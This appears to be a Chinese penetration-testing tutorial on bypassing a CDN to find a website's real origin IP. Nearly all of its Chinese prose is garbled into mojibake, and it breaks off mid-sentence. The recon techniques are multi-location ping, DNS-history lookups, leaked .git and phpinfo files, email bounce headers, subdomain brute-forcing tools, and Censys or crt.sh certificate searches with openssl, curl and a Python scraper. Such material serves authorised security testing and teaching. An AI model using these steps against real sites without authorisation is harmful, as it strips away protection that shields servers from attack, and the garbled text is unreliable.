https://shiming.gsxt.gov.cn/corp-query-search-1.html è·å–çœŸå®IP ä¸ºäº†ä¿è¯ç½‘ç»œçš„ç¨³å®šå’Œå¿«é€Ÿä¼ è¾“ï¼Œç½‘ç«™æœåŠ¡å•†ä¼šåœ¨ç½‘ç»œçš„ä¸åŒä½ç½®è®¾ç½®èŠ‚ç‚¹æœåŠ¡å™¨ï¼Œé€šè¿‡ CDNï¼ˆContent Delivery Networkï¼Œå†…å®¹åˆ†å‘ç½‘ç»œï¼‰æŠ€æœ¯ï¼Œå°†ç½‘ç»œè¯·æ±‚åˆ†å‘åˆ°æœ€ä¼˜çš„èŠ‚ç‚¹æœåŠ¡å™¨ä¸Šé¢ã€‚å¦‚æœç½‘ç«™å¼€å¯äº† CDN åŠ é€Ÿï¼Œå°±æ— æ³•é€šè¿‡ç½‘ç«™çš„åŸŸåä¿¡æ¯è·å–çœŸå®çš„ IPï¼Œè¦å¯¹ç›®æ ‡çš„ IP èµ„æºè¿›è¡Œæ”¶é›†ï¼Œå°±è¦ç»•è¿‡ CDN æŸ¥è¯¢åˆ°å…¶çœŸå®çš„ IP ä¿¡æ¯ã€‚ ä¸€ä¸ªå°tipï¼šæµè§ˆå™¨åˆ‡æ¢æ‰‹æœºæ¨¡å¼ï¼Œå¯èƒ½æ˜¯çœŸå®ipï¼Œå…¬ä¼—å·ã€å°ç¨‹åºä¸­çš„èµ„äº§ä¹Ÿå¯èƒ½å¯¹åº”çœŸå®ipã€‚ å¦‚ä½•åˆ¤æ–­æ˜¯å¦æœ‰CDN åœ¨å¯¹ç›®æ ‡ IP ä¿¡æ¯æ”¶é›†ä¹‹å‰ï¼Œé¦–å…ˆè¦åˆ¤æ–­ç›®æ ‡ç½‘ç«™æ˜¯å¦å¼€å¯äº† CDNï¼Œä¸€èˆ¬é€šè¿‡ä¸åŒåœ°æ–¹çš„ä¸»æœº ping åŸŸåå’Œ nslookup åŸŸåè§£æä¸¤ç§æ–¹æ³•ï¼Œé€šè¿‡æŸ¥çœ‹è¿”å›çš„ IP æ˜¯å¦æ˜¯å¤šä¸ªçš„æ–¹å¼æ¥åˆ¤æ–­ç½‘ç«™æ˜¯å¦å¼€å¯äº† CDNï¼Œå¦‚æœè¿”å›çš„ IP ä¿¡æ¯æ˜¯å¤šä¸ªä¸åŒçš„ IPï¼Œé‚£å°±æœ‰å¯èƒ½ä½¿ç”¨äº† CDN æŠ€æœ¯ã€‚ æ–¹æ³•ä¸€ï¼šå¤šåœ°ping ä½¿ç”¨å„ç§å¤šåœ° ping çš„æœåŠ¡ï¼ŒæŸ¥çœ‹å¯¹åº” IP åœ°å€æ˜¯å¦å”¯ä¸€ï¼Œå¦‚æœä¸å”¯ä¸€å¤šåŠæ˜¯ä½¿ç”¨äº†CDNï¼Œ å¤šåœ° Ping ç½‘ç«™æœ‰ï¼š å¯ä»¥åˆ°æœ‰å¤šä¸ªIPï¼Œä¸€èˆ¬è¿™ç§æ–¹æ³•è¦æ ¹æ®å¤šä¸ªç½‘ç«™éƒ½è¿›è¡Œå°è¯•ä¸€ä¸‹ï¼Œæ‰èƒ½æ›´å¥½çš„ç¡®å®šï¼Œä¸è¿‡è¿™é‡Œèƒ½ç”¨çš„æˆ‘çŸ¥é“çš„åªæœ‰ä¸¤ä¸ª http://ping.chinaz.com/ã€http://ping.aizhan.com/è€Œä¸”åè€…è¿˜ä¼¼ä¹å´©äº†ï¼ŒæŸ¥è¯¢æ²¡ååº” åˆå»è°·æ­Œæ‰¾äº†ä¸€ç•ªï¼Œæ— æœï¼Œæ„Ÿè§‰æœ‰éœ€è¦çš„è¯éœ€è¦å¤šç¿»ç¿»ä¸€äº›ç½‘ç«™äº†ã€‚ æ–¹æ³•äºŒï¼šnslookup è¯•ç”¨nslookupè¿›è¡Œæ£€æµ‹ï¼Œå¦‚æœè¿”å›åŸŸåè§£æå¯¹åº”å¤šä¸ªIPï¼Œé‚£ä¹ˆå¤šåŠæ˜¯è¯•ç”¨äº†CDN. nslookup http://example.com è¿™é‡Œçœ‹åˆ°ä¸€ä¸ªæ˜¯æœ‰å¤šä¸ªIPåœ°å€ï¼Œä¸€ä¸ªæ˜¯nameçš„å€¼ç›´æ¥å°±æ˜¯cdn.netä»€ä¹ˆçš„ï¼Œè¿™å¾ˆæ˜æ˜¾å°±æ˜¯æœ‰CDNäº† æ–¹æ³•ä¸‰ï¼šåœ¨çº¿å·¥å…· åœ¨çº¿å·¥å…·æŸ¥çœ‹æ˜¯å¦å­˜åœ¨CDNï¼Œå¯ä»¥å‚è€ƒä»¥ä¸‹ç«™ç‚¹: http://www.cdnplanet.com/tools/cdnfinder http://www.ipip.net/ip.html è¿™é‡Œæ¨èç¬¬äºŒä¸ªç«™ç‚¹ ç»•è¿‡CDN æŸ¥è¯¢å†å²DNSè®°å½• æŸ¥çœ‹ IP ä¸ åŸŸåç»‘å®šçš„å†å²è®°å½•ï¼Œå¯èƒ½ä¼šå­˜åœ¨ä½¿ç”¨ CDN å‰çš„è®°å½•ï¼Œç›¸å…³æŸ¥è¯¢ç½‘ç«™æœ‰ https://x.threatbook.cn/ https://censys.io/ipv4?q=baidu.com https://github.com/projectdiscovery/cdncheck â€“æœªä»”ç»†æŸ¥çœ‹ https://viewdns.info/iphistory/ https://securitytrails.com/ â€“éœ€è¦ä¼ä¸šé‚®ç®±æ³¨å†Œï¼Œä¸è¿‡å¾ˆå…¨ SecurityTrailsï¼ˆå‰èº«ä¸º DNS Trailsï¼‰æ‹¥æœ‰å¤§çº¦3.5ä¸‡äº¿DNSè®°å½•ï¼Œ3äº¿whoisè®°å½•ï¼Œ8äº¿SSLè¯ä¹¦è®°å½•ä»¥åŠè¶…è¿‡4.5äº¿å­åŸŸçš„è®°å½•æ•°æ®ã€‚è‡ª2008å¹´ä»¥æ¥ï¼Œç½‘ç«™æ¯å¤©éƒ½æ”¶é›†å’Œæ›´æ–°æµ·é‡æ•°æ®ã€‚ DNS è®°å½•ï¼š IPå†å² å­åŸŸåï¼š Complete DNSï¼ˆhttps://completedns.com/ï¼‰Complete DNS æ‹¥æœ‰è¶…è¿‡ 22 äº¿ä¸ªDNSå˜æ›´è®°å½•ï¼Œæä¾›APIï¼Œæ”¯æŒåŒæ—¶è¿›è¡Œå¤šåŸŸå/IPæŸ¥è¯¢ã€‚ WhoISrequest ï¼ˆhttps://whoisrequest.com/ï¼‰ WhoISrequest è¿™ä¸ªç½‘ç«™è‡ª2002å¹´ä»¥æ¥ä¸€ç›´åœ¨è·Ÿè¸ªå’Œè®°å½•DNSå†å²å˜æ›´ï¼Œæ•°æ®åº•è•´å¾ˆè¶³ã€‚ ä¸è¿‡è¿™é‡ŒæŸ¥äº†åŠå¤©æ²¡æŸ¥åˆ°ä»€ä¹ˆä¿¡æ¯ï¼Œè€Œä¸”è¿™ä¸ªç½‘ç«™ä¼¼ä¹å¯¹äºdnså†å²è®°å½•ç”¨çš„æ˜¯ä¸Šé¢çš„ç½‘ç«™çš„api Whoxyï¼ˆhttps://www.whoxy.com/ï¼‰ Whoxy æ‹¥æœ‰çˆ¬å–è¶…è¿‡ 3.65äº¿ä¸ªå­åŸŸæ•°æ®ï¼Œè¯¥ç½‘ç«™ API è°ƒç”¨éå¸¸æ–¹ä¾¿ï¼Œä»¥ XML å’Œ JSON æ ¼å¼è¿”å›æ•°æ®ã€‚ è¿˜æœ‰å¾ˆå¤šç½‘ç«™ï¼Œè¿™é‡Œå°±ä¸ä¸€ä¸€ä»‹ç»äº†ï¼Œè¯¦ç»†å¯æµè§ˆå‚è€ƒæ–‡ç« ï¼Œè¿™é‡Œæ±‡æ€»ä¸€ä¸‹ http://www.cdnplanet.com/tools/cdnfinder http://www.ipip.net/ip.html https://x.threatbook.cn/ https://censys.io/ipv4?q=baidu.com https://github.com/projectdiscovery/cdncheck https://viewdns.info/iphistory/ https://securitytrails.com/ https://completedns.com/ https://whoisrequest.com/ https://www.whoxy.com/ https://dnsdb.io/ https://reverse-ip.whoisxmlapi.com/ ä½¿ç”¨å›½å¤–ä¸»æœºè¯·æ±‚åŸŸå éƒ¨åˆ†å›½å†…çš„ CDN åŠ é€ŸæœåŠ¡å•†åªå¯¹å›½å†…çš„çº¿è·¯åšäº† CDN åŠ é€Ÿï¼Œä½†æ˜¯å›½å¤–çš„çº¿è·¯æ²¡æœ‰åšåŠ é€Ÿï¼Œè¿™æ ·å°±å¯ä»¥é€šè¿‡å›½å¤–çš„ä¸»æœºæ¥æ¢æµ‹çœŸå®çš„ IP ä¿¡æ¯ã€‚ æ¢æµ‹çš„æ–¹å¼ä¹Ÿæœ‰ä¸¤ç§ï¼Œå¯ä»¥åˆ©ç”¨å·²æœ‰çš„å›½å¤–ä¸»æœºç›´æ¥è¿›è¡Œæ¢æµ‹ï¼›å¦‚æœæ²¡æœ‰å›½å¤–ä¸»æœºï¼Œå¯ä»¥åˆ©ç”¨å…¬å¼€çš„å¤šåœ° ping æœåŠ¡ï¼ˆå¤šåœ° ping æœåŠ¡æœ‰å›½å¤–çš„æ¢æµ‹èŠ‚ç‚¹ï¼‰ï¼Œå¯ä»¥åˆ©ç”¨å›½å¤–çš„æ¢æµ‹èŠ‚ç‚¹è¿”å›çš„ä¿¡æ¯æ¥åˆ¤æ–­çœŸå®çš„ IP ä¿¡æ¯ã€‚ ç½‘ç«™ä¿¡æ¯æ³„éœ²æ¼æ´ æœåŠ¡å™¨æ—¥å¿—æ–‡ä»¶ æ¢é’ˆæ–‡ä»¶ï¼Œä¾‹å¦‚ phpinfo ç½‘ç«™å¤‡ä»½å‹ç¼©æ–‡ä»¶ .DS_Store .hg .git SVN Web.xml å­—å…¸éå¸¸é‡è¦ï¼Œå¾€å¾€ç–å¿½çš„ç‚¹å°±åœ¨ä¸€å°è¾¹ç¼˜æœåŠ¡å™¨ã€‚ å°tipï¼šphpinfo é¡µé¢ä¸­æœ‰ä¸€ä¸ª SERVER_ADDR å­—æ®µä¼šæ˜¾ç¤ºè¯¥ä¸»æœºçœŸå® IPã€‚ æŸ¥è¯¢å­åŸŸå è¿™é‡Œæ³¨æ„çš„å°±æ˜¯å­åŸŸåã€Cæ®µä»¥åŠæ—ç«™ï¼ˆåŒIPç½‘ç«™ï¼‰ ç”±äº CDN åŠ é€Ÿéœ€è¦æ”¯ä»˜ä¸€å®šçš„è´¹ç”¨ï¼Œå¾ˆå¤šç½‘ç«™åªå¯¹ä¸»ç«™åšäº† CDN åŠ é€Ÿï¼Œå­åŸŸåæ²¡æœ‰åš CDN åŠ é€Ÿï¼Œå­åŸŸåå¯èƒ½è·Ÿä¸»ç«™åœ¨åŒä¸€ä¸ªæœåŠ¡å™¨æˆ–è€…åŒä¸€ä¸ª C æ®µç½‘ç»œä¸­ï¼Œå¯ä»¥é€šè¿‡å­åŸŸåæ¢æµ‹çš„æ–¹å¼ï¼Œæ”¶é›†ç›®æ ‡çš„å­åŸŸåä¿¡æ¯ï¼Œé€šè¿‡æŸ¥è¯¢å­åŸŸåçš„ IP ä¿¡æ¯æ¥è¾…åŠ©åˆ¤æ–­ä¸»ç«™çš„çœŸå® IP ä¿¡æ¯ã€‚ â€”â€”â€”å…·ä½“çš„æ–¹æ³•åœ¨ä¸‹é¢å™è¿° é‚®ä»¶ä¿¡æ¯ ä¸€èˆ¬å¤§å‹ç½‘ç«™è‡ªå·±éƒ¨ç½²æ¶è®¾çš„é‚®ä»¶æœåŠ¡å™¨å¦‚æœå‘å¤–éƒ¨ç”¨æˆ·å‘é€é‚®ä»¶çš„è¯ï¼Œå¦‚æœä¸­é—´æœªç»ä»»ä½•æ•°æ®å¤„ç†å’Œé˜²æŠ¤æªæ–½ï¼Œé‚£ä¹ˆé‚®ä»¶å¤´éƒ¨çš„æºç ä¸­ä¼šåŒ…å«æ­¤é‚®ä»¶æœåŠ¡å™¨çš„çœŸå® IP åœ°å€ã€‚å¸¸è§çš„é‚®ä»¶è§¦å‘ç‚¹æœ‰ï¼š RSS è®¢é˜… é‚®ç®±æ³¨å†Œã€æ¿€æ´»å¤„ é‚®ç®±æ‰¾å›å¯†ç å¤„ äº§å“æ›´æ–°çš„é‚®ä»¶æ¨é€ æŸä¸šåŠ¡æ‰§è¡Œåå‘é€çš„é‚®ä»¶é€šçŸ¥ å‘˜å·¥é‚®ç®±ã€é‚®ä»¶ç®¡ç†å¹³å°ç­‰å…¥å£å¤„çš„å¿˜è®°å¯†ç  å¦å¤–è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªå¥‡æ·«æŠ€å·§ï¼Œé€šè¿‡å‘é€é‚®ä»¶ç»™ä¸€ä¸ªä¸å­˜åœ¨çš„é‚®ç®±åœ°å€ï¼Œæ¯”å¦‚ 000xxx@domain.com ï¼Œå› ä¸ºè¯¥ç”¨æˆ·ä¸å­˜åœ¨ï¼Œæ‰€ä»¥å‘é€å°†å¤±è´¥ï¼Œå¹¶ä¸”è¿˜ä¼šæ”¶åˆ°ä¸€ä¸ªåŒ…å«å‘é€è¯¥ç”µå­é‚®ä»¶ç»™ä½ çš„æœåŠ¡å™¨çš„çœŸå® IP é€šçŸ¥ã€‚ ç”Ÿäº§ä¸Šå¤šå…³æ³¨è¿™äº›ç‚¹ï¼Œä¸€ä¸ªä¸æˆåŠŸç»§ç»­æµ‹è¯•ä¸‹ä¸€ä¸ªé‚®ä»¶è§¦å‘ç‚¹ï¼Œå¾ˆå¤šå¤§å‹ç½‘ç«™çš„é‚®ä»¶æœåŠ¡å™¨ä¸æ­¢ä¸€å°ï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰éƒ½åšäº†é˜²æŠ¤å¤„ç†ï¼Œç»†èŠ‚å†³å®šæˆè´¥ã€‚ ç›®æ ‡ç½‘ç«™ APP åº”ç”¨ å¦‚æœç›®æ ‡ç½‘ç«™æœ‰è‡ªå·±çš„ Appï¼Œå¯ä»¥å°è¯•åˆ©ç”¨ Burp Suite ç­‰æµé‡æŠ“åŒ…å·¥å…·æŠ“å– App çš„è¯·æ±‚ï¼Œä»é‡Œé¢å¯èƒ½ä¼šæ‰¾åˆ°ç›®æ ‡çš„çœŸå® IPã€‚ å­åŸŸåæŸ¥è¯¢ è¿™é‡Œé™¤äº†å¸¸è§çš„ç½‘ç»œç©ºé—´å¦‚fofaã€shodanã€zoomeyeã€censysç­‰ï¼Œå°±æ˜¯ä¸€äº›å¼ºå¤§è„šæœ¬å·¥å…·äº†ã€‚è¿™é‡Œç†Ÿæ‚‰å‡ ä¸ªå¸¸è§çš„ SubDomainsBrute é¡¹ç›®åœ°å€ï¼šhttps://github.com/lijiejie/subDomainsBrute SubDomainsBrute æ˜¯é€šè¿‡çº¯ DNS çˆ†ç ´æ¥å¯»æ‰¾å­åŸŸåï¼Œä¸ºäº†æœ€å¤§æå‡è„šæœ¬æ•ˆç‡ï¼Œé‡‡ç”¨åç¨‹+å¤šè¿›ç¨‹çš„æ–¹å¼è¿›è¡Œçˆ†ç ´ã€‚Python 3.5 ä»¥ä¸Šéœ€è¦å®‰è£… aiodns åº“è¿›è¡Œå¼‚æ­¥æŸ¥è¯¢ï¼Œpython 2 éœ€è¦å®‰è£… dnspython åº“å’Œ gevent åç¨‹åº“ã€‚ python subDomainsBrute.py baidu.com ä¸”åœ¨æœ€è¿‘æ›´æ–°ä¹‹åæ˜¯æ”¯æŒæ‰«ææ³›è§£æåŸŸåçš„ï¼Œä½¿ç”¨ -w å‚æ•°ã€‚â€”â€”è¿™é‡Œç®€å•äº†è§£äº†ä¸€ä¸‹åŸŸåæ³›è§£æã€‚ ç®€å•æ¥è¯´å°±æ˜¯DNSçš„æ³›åŸŸåè§£æä¹Ÿå¯ä»¥ç†è§£ä¸ºå¸¦é€šé…ç¬¦çš„è§£æè®°å½•ï¼Œå¸¦é€šé…ç¬¦çš„è§£æè®°å½•æ˜¯ç”¨æ¥ä¸ºä¸å­˜åœ¨çš„å­åŸŸæä¾›è§£æè¯·æ±‚å“åº”çš„æ–¹æ³•ã€‚ ä¾‹å¦‚å­˜åœ¨ä¸€ä¸ªexample.comï¼Œå¦‚æœæˆ‘ä»¬è®¾ç½®é€šé…ç¬¦è®°å½•ï¼š*.example.comï¼Œåˆ™å¯¹å…¶ä¸å­˜åœ¨çš„æ‰€æœ‰å­åŸŸï¼Œæ¯”å¦‚abcd.example.comã€xxx.example.comï¼ˆè¿™äº›éƒ½æ˜¯ä¸å­˜åœ¨çš„å­åŸŸï¼‰ï¼Œåˆ™å¦‚æœæˆ‘ä»¬åœ¨å¯¹è¿™äº›å­åŸŸè¿›è¡Œè¯·æ±‚çš„æ—¶å€™ï¼Œéƒ½ä¼šè‡ªåŠ¨æŒ‡å‘example.comã€‚ å› æ­¤åŸºäºä¸Šè¿°åŸç†ï¼Œå¦‚æœæˆ‘ä»¬çš„ç›®æ ‡åŸŸåè®¾ç½®äº†è¿™æ ·çš„æ³›è§£æï¼Œé‚£æˆ‘ä»¬å¯ä»¥å‡­å€Ÿå¼ºå¤§çš„å­—å…¸å¯¹å…¶ä»»æ„å­åŸŸè¿›è¡Œè¯·æ±‚ï¼Œçœ‹æœ€ç»ˆè¿”å›çš„ipæ˜¯å¦ä¸å…¶ä¸»åŸŸIPä¸€è‡´ï¼Œå¦‚æœä¸€è‡´é‚£è¯´æ˜è¯¥å­åŸŸä¸å­˜åœ¨ï¼›ä½†å¦‚æœä¸ä¸€è‡´ï¼Œè¯´æ˜è¯¥å­åŸŸæ˜¯å­˜åœ¨çš„ã€‚ å½“ç„¶å¦‚æœç›®æ ‡åŸŸåæ²¡æœ‰è®¾ç½®æ³›è§£æï¼Œé‚£æˆ‘ä»¬åœ¨å¯¹å…¶å­åŸŸè¿›è¡Œè¯·æ±‚çš„æ—¶å€™ï¼Œå¦‚æœè¿”å›äº†ä¸ä¸»åŸŸIPåœ°å€ä¸åŒçš„æƒ…å†µï¼Œåˆ™ç›´æ¥è¯´æ˜è¯¥å­åŸŸå­˜åœ¨ æˆ‘ä»¬é’ˆå¯¹ä¸€ä¸ªæ³›è§£æçš„åŸŸåè¿›è¡Œçˆ†ç ´ï¼ŒsubDomainsBrute ä¼šæç¤º any-sub é”™è¯¯ï¼Œä¹‹åä½¿ç”¨ -w å‚æ•°å¼€å¯æ³›è§£æå¼ºåˆ¶çˆ†ç ´ ESD é¡¹ç›®åœ°å€ï¼šhttps://github.com/FeeiCN/ESD â€“å…·ä½“çš„å°±ä¸ä»‹ç»äº†ï¼Œçœ‹ä¸€ä¸‹ä½¿ç”¨æ•ˆæœå³å¯ï¼Œè¿™é‡Œæ‰«æå•ä¸ªåŸŸåçœ‹çœ‹ å°±æ˜¯é€Ÿåº¦æœ‰ç‚¹æ…¢ # æ‰«æå•ä¸ªåŸŸå esd -d qq.com # debugæ¨¡å¼æ‰«æå•ä¸ªåŸŸå esd=debug esd -d qq.com # æ‰«æå¤šä¸ªåŸŸåï¼ˆè‹±æ–‡é€—å·åˆ†éš”ï¼‰ esd --domain qq.com,tencent.com # æ‰«æå•ä¸ªåŸŸåä¸”è¿‡æ»¤å­åŸŸåä¸­å•ä¸ªç‰¹å®šå“åº”å†…å®¹ esd --domain mogujie.com --filter æœæœ¬åº— # æ‰«æå•ä¸ªåŸŸåä¸”è¿‡æ»¤å­åŸŸåä¸­å¤šä¸ªç‰¹å®šå“åº”å†…å®¹ esd --domain mogujie.com --filter æœæœ¬åº—,æ”¶è—åº—é“º # æ‰«ææ–‡ä»¶ï¼ˆæ–‡ä»¶ä¸­æ¯è¡Œä¸€ä¸ªåŸŸåï¼‰ esd --file targets.txt # è·³è¿‡ç›¸ä¼¼åº¦å¯¹æ¯”ï¼ˆå¼€å¯è¿™ä¸ªé€‰é¡¹ä¼šæŠŠæ‰€æœ‰æ³›è§£æçš„åŸŸåéƒ½è¿‡æ»¤æ‰ï¼‰ esd --domain qq.com --skip-rsc # å¹³å‡åˆ†å‰²å­—å…¸ï¼ŒåŠ å¿«çˆ†ç ´ esd --domain qq.com --split 1/4 # ä½¿ç”¨DNSåŸŸä¼ é€æ¼æ´è·å–å­åŸŸå esd --domain qq.com --dns-transfer # ä½¿ç”¨HTTPSè¯ä¹¦é€æ˜åº¦è·å–å­åŸŸå esd --domain qq.com --ca-info Layer å­åŸŸåæŒ–æ˜æœº é¡¹ç›®åœ°å€ï¼šhttps://hub.fastgit.org/euphrat1ca/LayerDomainFinder/releases/tag/3 Xray é¡¹ç›®åœ°å€ï¼šhttps://github.com/chaitin/xray xray æ˜¯ä¸€æ¬¾å¼ºå¤§çš„å®‰å…¨è¯„ä¼°å·¥å…·ï¼Œä¸€æ¬¾è‡ªåŠ¨åŒ–æ‰«æå™¨ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å…¶è‡ªå¸¦çš„ subdomain å­åŸŸåå‘æ˜åŠŸèƒ½æ¥é’ˆå¯¹æ€§æ¢æµ‹ï¼š subdomain åŠŸèƒ½æ”¯æŒæš´åŠ›ç ´è§£æ¨¡å¼å’Œéæš´åŠ›æ¨¡å¼ï¼Œå¯ä»¥åªæ¢æµ‹ web æœåŠ¡æˆ–è€…åªæ¢æµ‹ ip å¯è§£æçš„å­åŸŸï¼Œå¦å¤–æ”¯æŒ webhook æ•°æ®ä¼ é€’ï¼Œä½œä¸ºæ’ä»¶ç«¯æˆ–è€…åˆ†å‘æ¶ˆæ¯çš„æ¥æ”¶ç«¯æ¥ä½¿ç”¨éƒ½éå¸¸æ–¹ä¾¿å¿«æ·ã€‚ Bypass-firewalls-by-DNS-history é¡¹ç›®åœ°å€ï¼šhttps://github.com/vincentcox/bypass-firewalls-by-DNS-history Bypass-firewalls-by-DNS-history æ˜¯ä¸€æ¬¾é›†æˆå…¨è‡ªåŠ¨åŒ–çš„æ¢æµ‹å·¥å…·ï¼Œé€šè¿‡æ¢æµ‹ DNS å†å²è®°å½•ï¼Œæœç´¢æ—§çš„ DNS A Recordï¼Œæ”¶é›†å­åŸŸï¼Œå¹¶æ£€æŸ¥æœåŠ¡å™¨æ˜¯å¦å¯¹è¯¥åŸŸåè¿›è¡Œç­”å¤ã€‚ å¦å¤–å®ƒè¿˜åŸºäºæºæœåŠ¡å™¨å’Œé˜²ç«å¢™åœ¨HTMLå“åº”ä¸­çš„ç›¸ä¼¼æ€§é˜ˆå€¼æ¥åˆ¤æ–­ã€‚ OneForAll é¡¹ç›®åœ°å€ï¼šhttps://github.com/shmilylty/OneForAll æœç´¢å¼•æ“å‘ç°å­åŸŸå ä½¿ç”¨æœç´¢å¼•æ“è¯­æ³•ï¼Œå¦‚Google æˆ–è€…ç™¾åº¦ç­‰ Google-ã€‹site:xxx.com Fofa-ã€‹domain=\"xxx.com\" ç¬¬ä¸‰æ–¹èšåˆæœåŠ¡å‘ç°å­åŸŸå ç¬¬ä¸‰æ–¹èšåˆå¹³å° Netcraftã€Virustotalã€ThreatCrowdã€DNSdumpster å’Œ ReverseDNS ç­‰è·å–å­åŸŸä¿¡æ¯ã€‚ é€šè¿‡ SSL è¯ä¹¦ è¯ä¹¦é¢å‘æœºæ„ (CA) å¿…é¡»å°†ä»–ä»¬å‘å¸ƒçš„æ¯ä¸ª SSL/TLS è¯ä¹¦å‘å¸ƒåˆ°å…¬å…±æ—¥å¿—ä¸­ï¼ŒSSL/TLS è¯ä¹¦é€šå¸¸åŒ…å«åŸŸåã€å­åŸŸåå’Œç”µå­é‚®ä»¶åœ°å€ã€‚å› æ­¤å¯ä»¥åˆ©ç”¨ SSL/TLS è¯ä¹¦æ¥å‘ç°ç›®æ ‡ç«™ç‚¹çš„çœŸå® IP åœ°å€ã€‚ CDN è¿è¥å•†åœ¨ç»™æœåŠ¡å™¨æä¾›ä¿æŠ¤çš„åŒæ—¶ï¼Œä¹Ÿä¼šä¸å…¶æœåŠ¡å™¨è¿›è¡ŒåŠ å¯†é€šä¿¡ï¼ˆsslï¼‰ï¼Œè¿™æ—¶å½“æœåŠ¡å™¨çš„ 443 ç«¯å£æ¥å…¥åŸŸåæ—¶ä¹Ÿä¼šåœ¨ 443 ç«¯å£æš´éœ²å…¶è¯ä¹¦ï¼Œæˆ‘ä»¬é€šè¿‡è¯ä¹¦æ¯”å¯¹ä¾¿å¯å‘ç°ç½‘ç«™çš„çœŸå® IP åœ°å€ã€‚ åˆ©ç”¨ Censys å¼•æ“ï¼ˆhttps://censys.io/ï¼‰ Censys æœç´¢å¼•æ“èƒ½å¤Ÿæ‰«ææ•´ä¸ªäº’è”ç½‘ï¼Œæ¯å¤©éƒ½ä¼šæ‰«æ IPv4 åœ°å€ç©ºé—´ï¼Œä»¥æœç´¢æ‰€æœ‰è”ç½‘è®¾å¤‡å¹¶æ”¶é›†ç›¸å…³çš„ä¿¡æ¯ï¼Œå¯ä»¥åˆ©ç”¨ Censys è¿›è¡Œå…¨ç½‘æ–¹é¢çš„ SSL è¯ä¹¦æœç´¢ï¼Œæ‰¾åˆ°åŒ¹é…çš„çœŸå® IP ã€‚ å¯ä»¥çœ‹åˆ°ï¼Œå½“æˆ‘ä»¬é’ˆå¯¹ä¸€ä¸ªäº’è”ç½‘ IP åœ°å€è¿›è¡Œæœç´¢æ—¶ï¼Œæ˜¯æœ‰åŒ¹é…åˆ°è¯ä¹¦ sha1 ç­¾åçš„ åŒç†ï¼Œæˆ‘ä»¬æ ¹æ®åŸŸåæŒ‡çº¹æœç´¢ SSL è¯ä¹¦æŒ‡çº¹ï¼Œç„¶åå†åæŸ¥ IP å°±å¯ä»¥äº†ã€‚ é¦–å…ˆé’ˆå¯¹ç›®æ ‡åŸŸåï¼Œé€‰æ‹© Certificates è¯ä¹¦æœç´¢ï¼Œç»“æœå‡ºæ¥ä¸€å † æœ‰æ•ˆ çš„è¯ä¹¦å’Œ æ— æ•ˆ çš„è¯ä¹¦ï¼š æˆ‘ä»¬åœ¨æœç´¢çš„æ—¶å€™å¯ä»¥ä½¿ç”¨è¯­æ³•æ¥å…ˆæ£€ç´¢æœ‰æ•ˆè¯ä¹¦ï¼Œå¦‚æœæ— æœå†å›å»æŸ¥çœ‹æ— æ•ˆè¯ä¹¦ ä½¿ç”¨å‘½ä»¤è¡Œ é€šè¿‡ openssl å’Œ curl ç­‰å¸¸è§çš„åŸºç¡€å‘½ä»¤ï¼Œä¹ŸåŒæ ·å¯ä»¥è¾¾åˆ°åæŸ¥ SSL è¯ä¹¦çš„æ•ˆæœã€‚ opensslï¼šé™„ä¸Šæˆæœå›¾ openssl s_client -connect ip:443 | grep subject curlï¼š curl -v https://123.123.123.123 | grep 'subject' ä½¿ç”¨å·¥å…·å’Œè„šæœ¬ é€šè¿‡è‡ªå·±å†™å·¥å…·è„šæœ¬ï¼Œé›†æˆå‰é¢çš„1ã€2ä¸¤ç‚¹ï¼Œå®Œå…¨å¯ä»¥åšåˆ°ä¸€ä¸ªç®€æ˜“ç‰ˆçš„ SSL å…¨ç½‘è¯ä¹¦çˆ¬å–ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨ç°æœ‰çš„ä¸€äº›è„šæœ¬å·¥å…·å’Œç½‘ç«™ï¼Œçœçš„æˆ‘ä»¬è‡ªå·±è´¹åŠ›äº†ã€‚ ä¾‹å¦‚ CloudFlair ï¼Œé¡¹ç›®åœ°å€ï¼šhttps://github.com/christophetd/CloudFlair è„šæœ¬å…¼å®¹ python2.7 å’Œ 3.5ï¼Œéœ€è¦é…ç½® Censys APIï¼Œä¸è¿‡åªé’ˆå¯¹ç›®æ ‡ç½‘ç«™æ˜¯å¦ä½¿ç”¨ CloudFlare æœåŠ¡è¿›è¡Œæ¢æµ‹ã€‚ è¯ä¹¦æ”¶é›† å¯ä»¥é€šè¿‡ https://crt.sh è¿›è¡Œå¿«é€Ÿè¯ä¹¦æŸ¥è¯¢æ”¶é›† é™„ä¸ŠæŸ¥è¯¢çš„ python å°è„šæœ¬ï¼š import requests import re TIME_OUT = 60 def get_SSL(domain): domains = [] url = 'https://crt.sh/?q=%25.{}'.format(domain) response = requests.get(url,timeout=TIME_OUT) ssl = re.findall(\"&lt;TD&gt;(.*?).{}&lt;/TD&gt;\".format(domain),response.text) for i in ssl: i += '.' + domain domains.append(i) print(domains) if __name__ == '__main__': get_SSL(\"baidu.com\") è·å¾—æ‰€æœ‰åŒ…å«è¯ä¹¦çš„å­åŸŸï¼š é€šè¿‡æµ·å¤– DNS æŸ¥è¯¢ é’ˆå¯¹å›½å†…å¸‚åœºç”¨æˆ·ï¼Œå¤§éƒ¨åˆ†çš„ CDN æœåŠ¡å•†å¹¶æ²¡æœ‰åšæµ·å¤–å¸‚åœºçš„ CDN ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡å¯»æ‰¾å°ä¼—ã€å†·é—¨çš„æµ·å¤– DNS æŸ¥è¯¢ï¼Œçœ‹æ˜¯å¦èƒ½è·å¾—çœŸå® IP ã€‚ nslookup target.com &lt;æµ·å¤– DNS åœ°å€&gt; ä¹Ÿå¯ä»¥ä½¿ç”¨æµ·å¤–çš„è¶…çº§pingç±»çš„å¹³å°åœ¨çº¿å¤šå›½å®¶å¤šåœ°åŒºæµ‹è¯•ï¼Œæ¨è https://www.host-tracker.com/v3/check/ ï¼Œæ”¯æŒ 140 å¤šä¸ªåœ°åŒºçš„ ping æµ‹è¯•ï¼Œå¦å¤–æ”¯æŒé’ˆå¯¹æŸå­åŸŸè¶…é•¿æœŸçš„ç›‘æ§ï¼Œé€šè¿‡é‚®ä»¶é€šçŸ¥ï¼Œç®€ç›´å¤ªå¼ºå¤§äº†ã€‚â€”â€”å°±æ˜¯éœ€è¦æ°ªé‡‘ å°æŠ€å·§ï¼šåœ¨https://github.com/ 